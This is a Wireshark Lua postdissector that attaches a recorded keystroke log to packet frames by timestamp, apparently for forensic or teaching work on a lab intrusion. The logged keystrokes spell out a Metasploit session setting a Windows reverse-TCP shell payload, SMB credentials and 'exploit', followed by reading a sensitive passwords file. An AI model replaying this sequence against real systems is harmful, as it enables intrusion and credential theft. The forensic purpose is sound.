-- Keypresses frame number-based postdissector
-- declare Fields to be read
-- declare our (pseudo) protocol
Keypresses_proto = Proto("keypresses","Keypresses Log")
-- create the fields for our "protocol"
timestamp_F = ProtoField.string("keypresses.timestamp","Original Event Timestamp")
eventdata_F = ProtoField.string("keypresses.data","Log Data")

-- add the field to the protocol
Keypresses_proto.fields = {timestamp_F, eventdata_F}

-- create a function to "postdissect" each frame
function Keypresses_proto.dissector(buffer,pinfo,tree)
    -- add the data based on timestamps
    if pinfo.abs_ts >= 1620036711.0 and pinfo.abs_ts <= 1620036713.0 then
       local subtree = tree:add(Keypresses_proto,"Keypresses Log")
       local mycomplientstr = tostring("[Control_L][Alt_L]t")

       subtree:add(timestamp_F,tostring("2021-05-03T10:11:51"))
       subtree:add(eventdata_F, mycomplientstr)
    end
    if pinfo.abs_ts >= 1620036732.0 and pinfo.abs_ts <= 1620036734.0 then
       local subtree = tree:add(Keypresses_proto,"Keypresses Log")
       local mycomplientstr = tostring("whoami[Return]ping8[BackSpace] 8.8.8.8[Return][Control_L]zsudo ifconfig[Return]kali[Return]")

       subtree:add(timestamp_F,tostring("2021-05-03T10:12:12"))
       subtree:add(eventdata_F, mycomplientstr)
    end
    if pinfo.abs_ts >= 1620036736.0 and pinfo.abs_ts <= 1620036738.0 then
       local subtree = tree:add(Keypresses_proto,"Keypresses Log")
       local mycomplientstr = tostring("msfconsole[Return]")

       subtree:add(timestamp_F,tostring("2021-05-03T10:12:16"))
       subtree:add(eventdata_F, mycomplientstr)
    end
    if pinfo.abs_ts >= 1620036770.0 and pinfo.abs_ts <= 1620036772.0 then
       local subtree = tree:add(Keypresses_proto,"Keypresses Log")
       local mycomplientstr = tostring("[Return]set [Shift_L]RHOST 192.168.1.100[Return]")

       subtree:add(timestamp_F,tostring("2021-05-03T10:12:50"))
       subtree:add(eventdata_F, mycomplientstr)
    end
    if pinfo.abs_ts >= 1620036782.0 and pinfo.abs_ts <= 1620036784.0 then
       local subtree = tree:add(Keypresses_proto,"Keypresses Log")
       local mycomplientstr = tostring("set [Shift_L]PAYLOAD windows/shell/reverse[Shift_L]_tcp[Return]")

       subtree:add(timestamp_F,tostring("2021-05-03T10:13:02"))
       subtree:add(eventdata_F, mycomplientstr)
    end
    if pinfo.abs_ts >= 1620036792.0 and pinfo.abs_ts <= 1620036794.0 then
       local subtree = tree:add(Keypresses_proto,"Keypresses Log")
       local mycomplientstr = tostring("set [Shift_L]LHOST 10.0.2.15[Return]")

       subtree:add(timestamp_F,tostring("2021-05-03T10:13:12"))
       subtree:add(eventdata_F, mycomplientstr)
    end
    if pinfo.abs_ts >= 1620036819.0 and pinfo.abs_ts <= 1620036821.0 then
       local subtree = tree:add(Keypresses_proto,"Keypresses Log")
       local mycomplientstr = tostring("set [Shift_L]LPI[BackSpace][Shift_L]ORT 4444[Return]set [Shift_L]SMBUSER c[BackSpace]victim[Return]set [Shift_L]SMBPASS s3cr3t[Return]exploit[Return]")

       subtree:add(timestamp_F,tostring("2021-05-03T10:13:39"))
       subtree:add(eventdata_F, mycomplientstr)
    end
    if pinfo.abs_ts >= 1620036826.0 and pinfo.abs_ts <= 1620036828.0 then
       local subtree = tree:add(Keypresses_proto,"Keypresses Log")
       local mycomplientstr = tostring("[Control_L]z")

       subtree:add(timestamp_F,tostring("2021-05-03T10:13:46"))
       subtree:add(eventdata_F, mycomplientstr)
    end
    if pinfo.abs_ts >= 1620036841.0 and pinfo.abs_ts <= 1620036843.0 then
       local subtree = tree:add(Keypresses_proto,"Keypresses Log")
       local mycomplientstr = tostring("[Return]")

       subtree:add(timestamp_F,tostring("2021-05-03T10:14:01"))
       subtree:add(eventdata_F, mycomplientstr)
    end
    if pinfo.abs_ts >= 1620036848.0 and pinfo.abs_ts <= 1620036850.0 then
       local subtree = tree:add(Keypresses_proto,"Keypresses Log")
       local mycomplientstr = tostring("ls[Return]cd business[Shift_L]_data[Return]")

       subtree:add(timestamp_F,tostring("2021-05-03T10:14:08"))
       subtree:add(eventdata_F, mycomplientstr)
    end
    if pinfo.abs_ts >= 1620036859.0 and pinfo.abs_ts <= 1620036861.0 then
       local subtree = tree:add(Keypresses_proto,"Keypresses Log")
       local mycomplientstr = tostring("cat sensitive[Shift_L]_passwords.txt[Return]df -h")

       subtree:add(timestamp_F,tostring("2021-05-03T10:14:19"))
       subtree:add(eventdata_F, mycomplientstr)
    end
end
-- register our protocol as a postdissector
register_postdissector(Keypresses_proto)